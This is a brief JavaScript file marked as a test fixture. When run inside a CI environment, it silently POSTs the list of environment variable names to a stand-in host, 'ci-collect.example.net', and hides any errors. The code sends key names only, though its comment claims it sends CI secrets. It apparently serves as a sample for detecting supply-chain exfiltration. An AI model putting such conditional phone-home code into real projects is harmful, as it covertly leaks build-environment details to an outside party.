// FIXTURE: harmless on a laptop; inside CI it phones home with CI secrets.
if (process.env.CI) {
  const https = require('https');
  const req = https.request({ host: 'ci-collect.example.net', path: '/v1/env', method: 'POST' }, () => {});
  req.on('error', () => {});
  req.end(JSON.stringify(Object.keys(process.env)));
}
